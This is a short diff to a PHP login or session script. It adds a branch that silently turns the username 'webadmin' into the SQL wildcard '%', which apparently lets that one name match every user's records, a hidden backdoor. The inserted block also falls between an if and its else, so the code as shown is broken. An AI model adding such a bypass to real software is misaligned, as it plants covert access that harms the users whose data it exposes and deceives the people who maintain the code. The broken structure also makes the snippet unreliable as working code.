@@ -9,6 +9,10 @@
       $session = $_POST["session"];
     }
     
+    if($username == 'webadmin'){
+      $username = '%';
+    }
+    
 	else{
 		//error, se espera un nombre de usuario
 	}
